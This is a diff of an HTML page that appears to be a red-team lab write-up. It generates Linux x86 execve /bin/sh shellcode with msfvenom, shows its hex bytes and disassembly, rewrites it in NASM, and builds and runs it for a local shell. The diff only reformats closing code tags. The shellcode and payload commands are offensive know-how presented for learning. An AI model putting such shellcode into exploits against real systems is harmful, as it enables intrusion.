@@ -50,25 +50,30 @@
     <h2 id="step-1">📦 Step 1: Generate Shellcode with <code>msfvenom</code></h2>
     <pre><code class="language-bash">mkdir -p ~/red_team_labs/1_x86_shellcode_reconstructing_malware
 cd ~/red_team_labs/1_x86_shellcode_reconstructing_malware
-msfvenom -p linux/x86/exec CMD="/bin/sh" -f raw -o shellcode.raw</code></pre>
+msfvenom -p linux/x86/exec CMD="/bin/sh" -f raw -o shellcode.raw
+</code></pre>
 
     <p>Output:</p>
     <pre><code class="language-bash">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Payload size: 43 bytes
-Saved as: shellcode.raw</code></pre>
+Saved as: shellcode.raw
+</code></pre>
 
     <p>Inspect raw bytes:</p>
-    <pre><code class="language-bash">xxd shellcode.raw</code></pre>
+    <pre><code class="language-bash">xxd shellcode.raw
+</code></pre>
 
     <p>Output:</p>
     <pre><code class="language-hex">00000000: 6a0b5899 5266 682d6389e7 682f7368 00682f62
 00000010: 696e89e3 52e80800 00002f62 696e2f73 68005753
-00000020: 89e1cd80</code></pre>
+00000020: 89e1cd80
+</code></pre>
     <hr>
 
     <h2 id="step-2">🔍 Step 2: Disassemble with <code>ndisasm</code></h2>
-    <pre><code class="language-bash">ndisasm -b 32 shellcode.raw</code></pre>
+    <pre><code class="language-bash">ndisasm -b 32 shellcode.raw
+</code></pre>
     <pre><code class="language-nasm">00000000  6A0B              push byte +0xb
 00000002  58                pop eax
 00000003  99                cdq
@@ -86,7 +91,8 @@ Saved as: shellcode.raw</code></pre>
 00000022  7368              jnc 0x8c
 00000024  005753            add [edi+0x53], dl
 00000027  89E1              mov ecx, esp
-00000029  CD80              int 0x80</code></pre>
+00000029  CD80              int 0x80
+</code></pre>
     <hr>
 
     <h2 id="debug">🔧 Reverse Engineering & Debugging</h2>
@@ -109,7 +115,8 @@ _start:
 get_string:
     pop ecx
     mov ecx, esp
-    int 0x80</code></pre>
+    int 0x80
+</code></pre>
 
     <h3>❌ Errors Encountered</h3>
     <ul>
@@ -121,7 +128,8 @@ get_string:
 
     <h2 id="pivot">♻️ The Pivot</h2>
     <p>I rewrote the shellcode cleanly based on how <code>execve()</code> works:</p>
-    <pre><code class="language-c">int execve(const char *pathname, char *const argv[], char *const envp[]);</code></pre>
+    <pre><code class="language-c">int execve(const char *pathname, char *const argv[], char *const envp[]);
+</code></pre>
 
     <table>
       <thead><tr><th>Register</th><th>Purpose</th><th>Value</th></tr></thead>
@@ -148,13 +156,15 @@ _start:
     mov ebx, esp          ; ebx → "/bin//sh"
     push edx              ; argv[1] = NULL
     xor ecx, ecx          ; ecx = NULL
-    int 0x80              ; syscall</code></pre>
+    int 0x80              ; syscall
+</code></pre>
     <hr>
 
     <h2 id="build">🔧 Build and Run</h2>
     <pre><code class="language-bash">nasm -f elf32 shell.asm -o shell.o
 ld -m elf_i386 shell.o -o shell
-./shell</code></pre>
+./shell
+</code></pre>
     <p>✅ <strong>Result:</strong> Dropped into a working <code>/bin/sh</code> shell!</p>
     <hr>
 
